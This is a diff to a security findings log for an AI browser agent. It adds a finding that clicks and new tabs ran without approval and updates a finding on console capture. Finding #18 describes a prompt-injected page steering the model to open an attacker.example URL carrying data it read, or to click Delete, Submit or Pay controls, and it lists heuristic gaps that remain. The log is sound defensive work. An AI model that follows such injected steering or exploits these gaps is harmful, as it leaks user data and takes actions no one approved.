@@ -19,7 +19,8 @@ the authoritative source; the Confluence page is a navigable summary of it.
 - **Severity**: Critical
 - **Affected component**: `packages/browser-runtime/src/tools/approval.ts`
   and every gated tool (`run_console_command`, `fill_element_by_uid`,
-  `fill_form`, `computer` type/key, `upload_file_to_input`, downloads)
+  `fill_form`, `computer` type/key, `upload_file_to_input`, downloads; risky
+  clicks and new tabs since finding #18)
 - **Risk**: The gate returned `needs_approval` and the action ran when the
   model called the `confirm_risky_action` tool with `userConfirmed: true`.
   Nothing verified that a person had agreed, so a prompt-injected page
@@ -189,6 +190,40 @@ the authoritative source; the Confluence page is a navigable summary of it.
   own secret scanning and push protection in the repository settings too.
 - **Status**: Fixed.
 
+### 18. Clicks and new tabs ran without approval
+
+- **Severity**: High (was) → Fixed
+- **Affected component**: `packages/browser-runtime/src/tools/element.ts`
+  (`click`), `tools/computer.ts` (click and drag actions), `tools/tab.ts`
+  (`create_new_tab`), `tools/click-risk.ts`
+- **Risk**: a prompt-injected page could steer the model to open
+  `https://attacker.example/?d=<data it read>` in a new tab, carrying page
+  data out, or to click a destructive or confirming control (Delete, Submit,
+  Pay) with no approval. Only typing, filling and console commands were
+  gated.
+- **Current mitigation**: `create_new_tab` opens a page on the current tab's
+  origin at once; another origin needs a click (an "Allow on this site"
+  grant for that destination origin skips it); a non-`http(s)` scheme or a
+  query plus fragment over 128 characters always asks and never offers to
+  remember. `click` inspects the target in the page first
+  (`inspectClickTarget`, any frame, open and closed shadow roots) and asks
+  when it submits a form, links to another origin, is labelled with a word
+  from `RISKY_CLICK_WORDS`, or cannot be found. The `computer` tool's click
+  and drag actions map the screenshot point to the element under it and
+  apply the same rules; a point on a frame or canvas, or with no screenshot
+  to map it, asks. Grants stay per tool and origin, so a click grant never
+  opens a tab.
+- **Status**: Fixed. `click-risk.test.ts`, `element.test.ts`,
+  `computer.test.ts`, `tab.test.ts` and the "approval for clicks and new
+  tabs (A1)" suite in `tooling/e2e/agent.e2e.test.mjs` (an "evil" server on
+  another origin sees zero requests after Deny).
+- **Residual**: the word list is English and heuristic; a destructive
+  control with no telling label or form (for example a `div` with a click
+  handler named "Go") still runs at once. The DOM Health application audit
+  navigates the bound tab to same-origin discovered links itself
+  (`apty/page-navigation.ts`), outside the click tool; that path was not
+  changed.
+
 ## Open — fixable within this repo, not yet done
 
 None currently — the one entry that was here (1b, multi-session/multi-tab
@@ -217,9 +252,10 @@ diagnostic isolation) is now Fixed above.
 ### 3. Console-capture bridge runs on `<all_urls>`
 
 - **Severity**: Medium
-- **Affected component**: `apps/browser-extension/src/entrypoints/content/console-bridge.ts`,
-  registered in `manifest.json`'s `content_scripts` with `"matches":
-  ["<all_urls>"]`
+- **Affected component**: `apps/browser-extension/src/entrypoints/content/console-bridge.ts`
+  (which also installs DOM Health's `pushState`/`attachShadow` hooks),
+  registered on `<all_urls>` by the service worker since B5
+  (`packages/browser-runtime/src/runtime/page-hooks-registration.ts`)
 - **Risk**: This MAIN-world script wraps `console.log/info/warn/error/debug`
   and buffers every call, on every page the user visits — not just Apty
   pages. If the user is debugging on one tab while their banking site's tab
@@ -231,10 +267,15 @@ diagnostic isolation) is now Fixed above.
   strips tokens/passwords/headers from anything returned via
   `get_apty_page_logs`, and the tool only reads the active tab's buffer,
   not every tab's. The buffer is in-page memory only — nothing is persisted
-  to `chrome.storage` or sent anywhere until explicitly queried.
+  to `chrome.storage` or sent anywhere until explicitly queried. Since B5
+  the user can turn the script off, or exclude sites, in Settings →
+  Troubleshooting; it is registered with `chrome.scripting.registerContentScripts`
+  (`excludeMatches` from that list) instead of a static manifest entry, and
+  `get_apty_page_logs` no longer injects it into an excluded page.
 - **Recommended fix**: Scope the content script's `matches` to Apty's
-  target application domains, same as finding #2, once known.
-- **Status**: Open. Needs Apty's target domain list.
+  target application domains, same as finding #2, once known (the dynamic
+  registration takes such a list directly).
+- **Status**: Open, mitigated by the switch. Needs Apty's target domain list.
 
 ### 4. Apty Studio/Widget/Client integration mechanisms are unconfirmed designs
 
